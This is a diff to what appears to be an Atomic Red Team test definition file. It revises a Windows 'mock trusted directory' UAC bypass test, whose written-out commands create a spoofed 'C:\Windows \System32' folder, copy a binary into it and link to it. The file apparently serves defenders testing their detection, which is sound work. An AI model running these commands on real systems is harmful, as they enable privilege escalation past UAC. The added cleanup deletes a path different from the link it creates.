@@ -113,7 +113,7 @@ atomic_tests:
 
 - name: Bypass UAC by Mocking Trusted Directories
   description: |
-    Creates a fake "trusted directory" and copies a binary to bypass UAC
+    Creates a fake "trusted directory" and copies a binary to bypass UAC. The UAC bypass may not work on fully patched systems, however the directory structure will be created.
 
   supported_platforms:
     - windows
@@ -122,12 +122,15 @@ atomic_tests:
     executable_binary:
       description: Binary to execute with UAC Bypass
       type: path
-      default: C:\Windows\System32\mmc.exe
+      default: C:\Windows\System32\cmd.exe
 
   executor:
     name: command_prompt
-    elevation_required: false
+    elevation_required: true
     command: |
-      mkdir "\\?\C:\Windows\System32 \"
-      copy C:\Windows\System32\mmc.exe "\\?\C:\Windows\System32 \"
-      mklink c:\Users\dwhite\Desktop\testbypass.exe ""\\?\C:\Windows\System32 \mmc.exe"
+      mkdir "\\?\C:\Windows \System32\"
+      copy "#{executable_binary}" "\\?\C:\Windows \System32\mmc.exe"
+      mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"
+    cleanup_command: |
+      rd "\\?\C:\Windows \" /S /Q
+      del "c:\temp\testbypass.exe"
